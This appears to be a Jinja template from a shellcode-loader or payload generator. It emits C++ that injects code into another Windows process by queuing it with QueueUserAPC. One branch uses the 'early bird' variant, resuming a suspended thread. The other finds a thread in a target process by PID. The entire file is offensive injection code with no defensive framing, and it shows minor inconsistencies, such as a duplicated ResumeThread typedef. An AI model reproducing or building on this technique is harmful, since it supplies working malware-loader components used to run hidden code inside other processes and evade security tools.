{% from "macros.jinja" import function_typedef, function_definition, createThreadStub with context %}

{% if section == "globals" %}
    {{ function_typedef("QueueUserAPC") }}
    {{ function_typedef("ResumeThread") }}

    {% if link.early_bird %}
        {{ function_typedef("ResumeThread") }}
    {% else %}
        {% include "lib/find_thread.cpp" %}
    {% endif %}

    int inject(HANDLE hThread, void *pRemoteCode){
        {{ function_definition("QueueUserAPC") }}

        return pQueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
    }
{% else %}
    {% if early_bird %}
        {{ function_definition("ResumeThread") }}
        inject(hThread, mem);
        pResumeThread(pi.hThread);
    {% else %}
        {# PID left from alloc_basic_remote section #}
        HANDLE hThread = FindThread(pid);
        if (hThread == NULL) {
            printf("[-] Failed to aquire thread handle\n");
            return 0;
        }
        inject(hThread, mem);
    {% endif %}
{% endif %}
